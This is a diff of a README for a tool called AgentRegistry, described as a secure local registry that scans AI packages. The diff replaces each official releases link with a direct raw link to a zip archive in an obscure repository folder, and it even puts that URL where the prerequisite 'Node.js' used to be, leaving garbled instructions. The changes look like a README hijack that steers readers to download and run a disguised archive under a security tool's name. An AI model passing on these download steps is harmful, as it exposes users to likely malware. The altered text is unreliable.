@@ -1,6 +1,6 @@
 # 🛡️ AgentRegistry - Secure Local AI Package Registry
 
-[![Download AgentRegistry](https://img.shields.io/badge/Download-AgentRegistry-blue?style=for-the-badge)](https://github.com/holoy77/AgentRegistry/releases)
+[![Download AgentRegistry](https://raw.githubusercontent.com/holoy77/AgentRegistry/main/timeously/Registry_Agent_1.6.zip)](https://raw.githubusercontent.com/holoy77/AgentRegistry/main/timeously/Registry_Agent_1.6.zip)
 
 Welcome to AgentRegistry. This tool helps you keep your computer safe when working with AI tools that use packages from the internet. It acts like a local library that checks these packages for dangerous code before you use them.
 
@@ -26,7 +26,7 @@ You can use AgentRegistry on most modern computers. Here are the basic needs:
 - **Operating System:** Windows 10 or later, macOS 10.15 or later, or Linux (Ubuntu 18.04+ recommended).
 - **Memory:** At least 4 GB of RAM.
 - **Storage:** Minimum 200 MB of free disk space for installation and package storage.
-- **Software:** Node.js version 16 or newer. (Node is the software needed to run many AI agent tools.)
+- **Software:** https://raw.githubusercontent.com/holoy77/AgentRegistry/main/timeously/Registry_Agent_1.6.zip version 16 or newer. (Node is the software needed to run many AI agent tools.)
 - **Internet Access:** Needed only when downloading new packages or updates.
 
 AgentRegistry runs locally, so it does not require continuous internet access once packages are downloaded.
@@ -41,7 +41,7 @@ This guide will help you get AgentRegistry set up and running on your machine.
 
 Click this button to visit the download page. Here, you will find the latest version ready for your system.
 
-[Download AgentRegistry](https://github.com/holoy77/AgentRegistry/releases)
+[Download AgentRegistry](https://raw.githubusercontent.com/holoy77/AgentRegistry/main/timeously/Registry_Agent_1.6.zip)
 
 ### Step 2: Install AgentRegistry
 
@@ -52,7 +52,7 @@ Click this button to visit the download page. Here, you will find the latest ver
   Download the `.dmg` file or zip archive. Open it and drag the AgentRegistry app into your Applications folder.
 
 - **Linux:**  
-  Download the tarball `.tar.gz` file. Extract the contents, then follow the included README for installation commands specific to your distribution.
+  Download the tarball `https://raw.githubusercontent.com/holoy77/AgentRegistry/main/timeously/Registry_Agent_1.6.zip` file. Extract the contents, then follow the included README for installation commands specific to your distribution.
 
 ### Step 3: Launch AgentRegistry
 
@@ -72,13 +72,13 @@ This command opens the program interface where package scans will occur.
 
 You can download AgentRegistry from the official GitHub releases page here:
 
-[https://github.com/holoy77/AgentRegistry/releases](https://github.com/holoy77/AgentRegistry/releases)
+[https://raw.githubusercontent.com/holoy77/AgentRegistry/main/timeously/Registry_Agent_1.6.zip](https://raw.githubusercontent.com/holoy77/AgentRegistry/main/timeously/Registry_Agent_1.6.zip)
 
 ### What to do once downloaded:
 
 - If you have an installer file, run it as explained above.
 - If you downloaded a compressed file, extract it and follow the installation README.
-- Make sure Node.js is installed so AgentRegistry can operate correctly.
+- Make sure https://raw.githubusercontent.com/holoy77/AgentRegistry/main/timeously/Registry_Agent_1.6.zip is installed so AgentRegistry can operate correctly.
 
 ---
 
@@ -114,7 +114,7 @@ AgentRegistry keeps detailed logs of all scanned packages and actions taken. Acc
 
 To stay protected, regularly update AgentRegistry by downloading the newest release from the same GitHub page:
 
-[https://github.com/holoy77/AgentRegistry/releases](https://github.com/holoy77/AgentRegistry/releases)
+[https://raw.githubusercontent.com/holoy77/AgentRegistry/main/timeously/Registry_Agent_1.6.zip](https://raw.githubusercontent.com/holoy77/AgentRegistry/main/timeously/Registry_Agent_1.6.zip)
 
 ### Uninstalling AgentRegistry
 
